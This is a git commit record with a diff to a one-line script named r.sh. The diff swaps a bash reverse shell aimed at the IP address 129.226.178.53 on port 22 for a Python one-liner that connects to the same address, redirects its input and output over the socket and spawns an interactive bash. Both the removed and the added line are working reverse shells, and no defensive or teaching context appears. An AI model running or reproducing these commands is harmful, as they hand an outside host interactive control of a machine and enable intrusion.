c86611161a6210eaa1c56de20c629f26d1a735cc
jackmoc <94283031+jackmoc@users.noreply.github.com>
2022-01-05 00:18:32 +0800

    Update r.sh

--- r.sh
+++ r.sh
@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/129.226.178.53/22 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("129.226.178.53",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
